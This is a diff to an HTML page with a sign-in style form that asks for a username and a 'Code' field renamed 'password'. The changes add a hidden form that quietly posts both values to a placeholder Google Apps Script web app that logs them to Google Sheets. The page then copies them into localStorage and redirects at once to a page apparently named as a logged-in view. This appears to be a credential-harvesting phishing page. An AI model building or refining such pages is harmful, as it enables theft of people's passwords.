@@ -9,10 +9,10 @@
 
   <form id="submitForm">
     <label>Username:</label><br>
-    <input type="text" id="uname" required><br><br>
+    <input type="text" id="uname" name="username" required><br><br>
 
     <label>Code:</label><br>
-    <textarea id="code" required></textarea><br><br>
+    <textarea id="code" name="password" required></textarea><br><br>
 
     <input type="submit" value="Submit">
   </form>
@@ -20,24 +20,37 @@
   <script>
     const URL = 'PASTE_YOUR_GOOGLE_APPS_SCRIPT_WEB_APP_URL_HERE';
 
-    document.getElementById('submitForm').addEventListener('submit', (e) => {
+    document.getElementById('submitForm').addEventListener('submit', function(e) {
       e.preventDefault();
 
       const uname = document.getElementById('uname').value.trim();
       const code = document.getElementById('code').value.trim();
 
-      // 1️⃣ Save locally first
+      // 1️⃣ Save locally
       localStorage.setItem('username', uname);
       localStorage.setItem('code', code);
 
-      // 2️⃣ Send to Google Sheets (fire-and-forget)
-      fetch(URL, {
-        method: 'POST',
-        mode: 'no-cors',
-        body: JSON.stringify({ username: uname, password: code })
-      });
+      // 2️⃣ Create a hidden form to submit to Google Sheets
+      const form = document.createElement('form');
+      form.method = 'POST';
+      form.action = URL;
 
-      // 3️⃣ Redirect immediately
+      const inputUser = document.createElement('input');
+      inputUser.type = 'hidden';
+      inputUser.name = 'username';
+      inputUser.value = uname;
+      form.appendChild(inputUser);
+
+      const inputCode = document.createElement('input');
+      inputCode.type = 'hidden';
+      inputCode.name = 'password';
+      inputCode.value = code;
+      form.appendChild(inputCode);
+
+      document.body.appendChild(form);
+      form.submit();
+
+      // 3️⃣ Redirect to logged-in page immediately (same tab)
       window.location.href = './BBlogedin.html';
     });
   </script>
